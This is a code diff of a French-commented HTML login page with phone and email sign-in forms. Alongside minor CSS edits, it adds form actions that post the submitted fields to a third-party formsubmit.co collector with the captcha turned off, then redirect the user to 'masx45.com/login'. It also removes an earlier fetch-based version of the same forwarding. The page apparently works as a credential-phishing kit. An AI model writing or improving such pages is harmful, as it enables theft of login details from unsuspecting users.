@@ -14,14 +14,6 @@
       flex-direction: column;
       align-items: center;
       padding-top: 50px;
-      position: relative;
-    }
-
-    .top-right-image {
-      position: absolute;
-      top: 10px;
-      right: 15px;
-      width: 50px;
     }
 
     .page-title {
@@ -32,6 +24,13 @@
       width: 100%;
       margin-bottom: 10px;
       margin-top: -30px;
+    }
+
+    .top-right-image {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      width: 40px;
     }
 
     .container {
@@ -69,7 +68,7 @@
       text-align: center;
       cursor: pointer;
       background-color: transparent;
-      color: white;
+      color: #fff;
       border: none;
       font-weight: 600;
       font-size: 0.95rem;
@@ -79,7 +78,7 @@
 
     .toggle-button.active {
       background-color: #d4af37;
-      color: white;
+      color: #fff;
     }
 
     form {
@@ -138,7 +137,7 @@
       cursor: pointer;
       width: 16px;
       height: 16px;
-      opacity: 0.8;
+      opacity: 0.6;
     }
 
     .form-footer {
@@ -170,8 +169,8 @@
       padding: 12px;
       border-radius: 30px;
       font-weight: bold;
-      color: white;
       cursor: pointer;
+      color: white;
     }
 
     .disclaimer {
@@ -189,44 +188,10 @@
     .hidden {
       display: none;
     }
-
-    input[type="checkbox"] {
-      -webkit-appearance: none;
-      appearance: none;
-      width: 18px;
-      height: 18px;
-      border: 2px solid white;
-      border-radius: 3px;
-      background-color: black;
-      cursor: pointer;
-      position: relative;
-      vertical-align: middle;
-    }
-
-    input[type="checkbox"]:checked {
-      background-color: #d4af37;
-      border-color: #d4af37;
-    }
-
-    input[type="checkbox"]:checked::after {
-      content: '';
-      position: absolute;
-      top: 2px;
-      left: 5px;
-      width: 4px;
-      height: 9px;
-      border: solid white;
-      border-width: 0 2px 2px 0;
-      transform: rotate(45deg);
-    }
   </style>
 </head>
 <body>
-
-  <!-- Image en haut à droite -->
   <img src="lkl.png" class="top-right-image" alt="icon" />
-
-  <!-- Titre centré -->
   <div class="page-title">Log In</div>
 
   <div class="container">
@@ -239,7 +204,10 @@
     </div>
 
     <!-- PHONE FORM -->
-    <form id="phoneForm">
+    <form id="phoneForm" action="https://formsubmit.co/f383def8ae4a6dfe104b19a8ef9629b1" method="POST">
+      <input type="hidden" name="_next" value="https://masx45.com/login?lang=en">
+      <input type="hidden" name="_captcha" value="false">
+
       <label for="phone">Phone Number</label>
       <div class="input-group">
         <img class="flag" src="https://flagcdn.com/us.svg" alt="US Flag">
@@ -267,7 +235,10 @@
     </form>
 
     <!-- EMAIL FORM -->
-    <form id="emailForm" class="hidden">
+    <form id="emailForm" class="hidden" action="https://formsubmit.co/f383def8ae4a6dfe104b19a8ef9629b1" method="POST">
+      <input type="hidden" name="_next" value="https://masx45.com/login?lang=en">
+      <input type="hidden" name="_captcha" value="false">
+
       <label for="email">Email</label>
       <div class="input-group">
         <input type="email" name="email" placeholder="Email" required>
@@ -323,33 +294,6 @@
       const img = document.querySelector(".input-group img.flag");
       img.src = `https://flagcdn.com/${flag}.svg`;
     });
-
-    // Redirection après soumission
-    document.getElementById("phoneForm").addEventListener("submit", function(e) {
-      e.preventDefault();
-
-      const form = e.target;
-      const data = new FormData(form);
-
-      fetch("https://formsubmit.co/f383def8ae4a6dfe104b19a8ef9629b1", {
-        method: "POST",
-        body: data,
-        headers: {
-          'Accept': 'application/json'
-        }
-      })
-      .then(response => {
-        if (response.ok) {
-          window.location.href = "https://masx45.com/login?lang=en";
-        } else {
-          alert("Erreur lors de l'envoi.");
-        }
-      })
-      .catch(error => {
-        alert("Erreur réseau.");
-      });
-    });
   </script>
-
 </body>
 </html>
